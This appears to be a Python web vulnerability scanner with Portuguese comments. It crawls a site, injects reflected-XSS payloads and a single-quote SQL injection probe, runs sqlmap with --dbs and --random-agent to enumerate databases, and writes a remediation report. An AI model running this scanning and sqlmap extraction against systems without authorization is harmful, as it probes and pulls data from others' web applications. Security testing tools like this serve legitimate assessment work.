import sys
import requests
import subprocess
import datetime
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

# Classe principal que gerencia todo o fluxo do pentest
class SecuritySuite:
    def __init__(self, target):
        self.target = target
        self.endpoints = [] # Lista final de URLs unicas
        self.results = []
        self.seen_signatures = set() # Cache para evitar scan repetido (ex: id=1 e id=2)
        # Headers simulando browser real para evitar block simples
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36'
        }

    # --- 1. CRAWLER / DISCOVERY ---
    def get_links(self, url):
        links = set()
        try:
            resp = requests.get(url, headers=self.headers)
            soup = BeautifulSoup(resp.text, "html.parser")
            for a in soup.find_all('a', href=True):
                full_url = urljoin(self.target, a['href'])
                # Restricao de escopo: só segue links do proprio dominio
                if self.target in full_url:
                    links.add(full_url)
        except:
            pass # Ignora erros de conexao pontuais no crawler
        return links

    # Logica para desduplicar parametros. Ex: page.php?id=1 e ?id=2 são o mesmo vetor de ataque.
    def add_if_unique(self, url):
        parsed = urlparse(url)
        # Extrai apenas as chaves dos parametros (ex: ['id', 'cat'])
        query = parse_qs(parsed.query)
        
        if not query: return # Ignora URLs estaticas sem parametros GET

        param_keys = list(query.keys())
        # Cria uma "assinatura": caminho + nomes_dos_params
        signature = f"{parsed.path}?{','.join(sorted(param_keys))}"

        if signature not in self.seen_signatures:
            self.seen_signatures.add(signature)
            self.endpoints.append(url)
            print(f"    [+] Endpoint mapeado: {url}")

    def discovery(self):
        print(f"[*] [1/4] Iniciando Crawler e Discovery...")
        # Fase 1: Coleta links da Home
        base_links = self.get_links(self.target)
        urls_to_scan = set(base_links)
        urls_to_scan.add(self.target)

        print(f"    Target inicial: {len(urls_to_scan)} links.")

        # Fase 2: Filtra e aprofunda (Nivel 2)
        for url in urls_to_scan:
            if "?" in url:
                self.add_if_unique(url)
            else:
                # Se nao tem parametro na URL, entra nela pra procurar links internos
                sub_links = self.get_links(url)
                for sub in sub_links:
                    if "?" in sub:
                        self.add_if_unique(sub)
        print(f"    -> Total de vetores de ataque unicos: {len(self.endpoints)}")

    # --- 2. SCANNER XSS Refletido ---
    def scan_xss(self):
        print("\n[*] [2/4] Executando Scanner XSS..")
        # Payloads variados para tentar quebrar diferentes contextos
        # 1. Padrão, 2. Quebra de atributo, 3. Quebra de script JS
        payloads = ["<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>","';alert('XSS');//" ]
        
        for url in self.endpoints:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            for param, _ in query_params.items():
                for payload in payloads:
                    # Copia params para nao alterar a URL original do loop
                    temp_params = query_params.copy()
                    temp_params[param] = [payload] # Inject
                    try:
                        # Reconstroi URL limpa apenas com path + params injetados
                        target_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        resp = requests.get(target_url, params=temp_params, headers=self.headers, timeout=5)
                        
                        # Se o payload voltar no body, temos XSS Refletido
                        if payload in resp.text:
                            print(f"    [!] VULN: XSS Refletido em '{param}'")
                            self.results.append({
                                "tool": "Scanner Próprio",
                                "vuln": "Reflected XSS",
                                "url": url,
                                "info": f"Input '{param}' refletiu o payload ('{payload}') sem sanitizacao.",
                                "fix": "Sanitize inputs e utilize Content Security Policy (CSP)."
                            })
                            break # Achou um payload que funciona, pula pro proximo param
                    except: pass

    # --- 3. SCANNER SQLi (Própio) ---
    def scan_sqli_manual(self):
        print("\n[*] [3/4] Testando SQL Injection (Error-Based)...")
        # Strings que indicam vazamento de erro do banco de dados
        db_errors = ["SQL syntax", "mysql_fetch", "quoted string not properly terminated", "unclosed quotation mark"]
        fuzz = "'" # Aspa simples para quebrar a query SQL
        
        for url in self.endpoints:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            for param, _ in query_params.items():
                temp_params = query_params.copy()
                temp_params[param] = [fuzz]
                
                try:
                    target_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    resp = requests.get(target_url, params=temp_params, headers=self.headers, timeout=5)
                    
                    # Procura por erros conhecidos no HTML retornado
                    for err in db_errors:
                        if err in resp.text:
                            print(f"    [!] VULN: Possivel SQLi (SQLinjection) confirmado em '{param}'")
                            self.results.append({
                                "tool": "Scanner Próprio",
                                "vuln": "SQL Injection (Error Based)",
                                "url": url,
                                "info": f"Injeção de aspa (') gerou erro de DB: {err}",
                                "fix": "Utilize Prepared Statements (Consultas Parametrizadas) no backend."
                            })
                            break
                except: pass

    # --- 4. Orquestrando o SQLMAP ---
    def run_sqlmap(self):
        print("\n[*] [4/4] Orquestrando SQLMap (Validaçãoo Avançada)...")
        # Check basico de dependencia
        try:
            subprocess.run(["sqlmap", "--version"], capture_output=True, check=True)
        except:
            print("    [Erro] SQLMap não encontrado no PATH.")
            return

        for url in self.endpoints:
            print(f"    -> Analisando: {url}")
            # Flags: --batch (sem interacao do usuario), --dbs (verifica qual banco), --random-agent (Escolhe um User-Agent aleatório) --level=1 (rapido) --level=3 (médio) --level=5 (profundo)
            cmd = ["sqlmap", "-u", url, "--batch", "--dbs", "--random-agent", "--level=1"]
            
            try:
                # Captura stdout para processar o resultado sem precisar ler logs
                proc = subprocess.run(cmd, capture_output=True, text=True)
                output = proc.stdout.lower()
                
                #Buscando strings de sucesso do sqlmap
                if "available databases" in output or "fetching database names" in output:
                    print(f"    [!!!] CRITICAL: SQLMap confirmou extração de dados!")
                    self.results.append({
                        "tool": "SQLMap Automation",
                        "vuln": "SQL Injection (Data Extraction)",
                        "url": url,
                        "info": "Ferramenta conseguiu listar os bancos de dados (dbs)."
                    })
            except Exception as e:
                print(f"    [Erro] Falha ao invocar subprocesso: {e}")

    #Relatório
    def report(self):
        print("\n[*] Gerando Relatorio Final...")
        fname = "relatorio_final.txt"
        
        with open(fname, "w") as f:
            f.write(f"RELATORIO DE SEGURANCA AUTOMATIZADO\n")
            f.write(f"Scan realizado em: {datetime.datetime.now()}\n")
            f.write(f"Alvo: {self.target}\n")
            f.write("-" * 50 + "\n")
            
            if not self.results:
                f.write("Nenhuma vulnerabilidade critica detectada nos testes.\n")
            
            for res in self.results:
                f.write(f"\n[+] Vulnerabilidade: {res['vuln']}\n")
                f.write(f"    Ferramenta: {res['tool']}\n")
                f.write(f"    URL: {res['url']}\n")
                f.write(f"    Detalhes: {res['info']}\n")
                if 'fix' in res:
                    f.write(f"    Recomendação: {res['fix']}\n")
                f.write("-" * 30 + "\n")

        print(f"[*] Salvo em: {fname}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 scanner.py <url>")
        sys.exit()
    
    app = SecuritySuite(sys.argv[1])
    app.discovery()
    
    # So vair rodar os scans pesados se achar algo realmente atacavel
    if app.endpoints:
        app.scan_xss()
        app.scan_sqli_manual()
        app.run_sqlmap()
        app.report()
    else:
        print("[!] Nenhum endpoint com parametros GET encontrado.")